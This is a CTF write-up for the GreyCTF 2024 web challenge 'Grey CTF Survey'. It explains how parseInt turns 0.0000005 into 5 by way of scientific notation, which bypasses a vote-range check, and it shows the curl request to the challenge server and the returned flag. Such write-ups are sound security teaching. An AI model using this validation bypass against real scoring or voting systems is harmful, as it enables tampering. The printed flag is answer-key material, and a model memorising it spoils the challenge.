---
title: Grey CTF Survey
author: yufong
categories: [GreyCTF 2024, Web]
date: 2024-04-20
date_time: 2024-04-20 18:09
tags: 
  - greyctf-2024
  - js/parseInt
info:
  description: "Improper use of `parseInt` leads to unexpected results"
  difficulty: 2
solved: yes
solution: "https://github.com/NUSGreyhats/greyctf24-challs-public/tree/main/quals/web/greyctf-survey"
img_path: /_posts/Writeups/CTF/GreyCTF%202024/Web/Grey%20CTF%20Survey/attachments/
image:
  path: /_posts/Writeups/CTF/GreyCTF%202024/Web/Grey%20CTF%20Survey/attachments/../../Beautiful%20Styles/attachments/Beautiful%20Styles-20240510000105525.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Challenge Description

{{page.info.description}}

## Source Code Analysis

```
app.post('/vote', async (req, res) => {
    const {vote} = req.body;
    if(typeof vote != 'number') {
        return res.status(400).json({
            "error": true,
            "msg":"Vote must be a number"
        });
    }
    if(vote < 1 && vote > -1) {
        score += parseInt(vote);
        if(score > 1) {
            score = -0.42069;
            return res.status(200).json({
                "error": false,
                "msg": config.flag,
            });
        }
        return res.status(200).json({
            "error": false,
            "data": score,
            "msg": "Vote submitted successfully"
        });
    } else {
        return res.status(400).json({
            "error": true,
            "msg":"Invalid vote"
        });
    }
})
```
>Vulnerability Details:
>[Solving a Mystery Behavior of parseInt() in JavaScript](https://dmitripavlutin.com/parseint-mystery-javascript/)
>- User input, an integer is passed into `parseInt()`, causing an unexpected value.
>- When an integer is passed into `parseInt()` 
>	1. it is converted to a string then into an integer again, 
>	2. if a number gets too large/small, "[Scientific Notation](https://en.wikipedia.org/wiki/Scientific_notation)" is used
>	3. So `0.0000005` turns into `5e-7` (String) and then `5` (int)
{: .prompt-info}

```
String(0.5); // => '0.5'  

String(0.05); // => '0.05'  

String(0.005); // => '0.005'  

String(0.0005); // => '0.0005'  

String(0.00005); // => '0.00005'  

String(0.000005); // => '0.000005'  

String(0.0000005); // => '5e-7' => 5
```



## Solution

```
┌──(root💀kali)-[~/boxes/nusgreyhat/WEB/Grey CTF Survey]
└─$ curl -H "Content-Type: application/json" -d '{"vote":0.0000005}' http://challs.nusgreyhats.org:33334/vote
{"error":false,"msg":"grey{50m371m35_4_l177l3_6035_4_l0n6_w4y}"}   
```



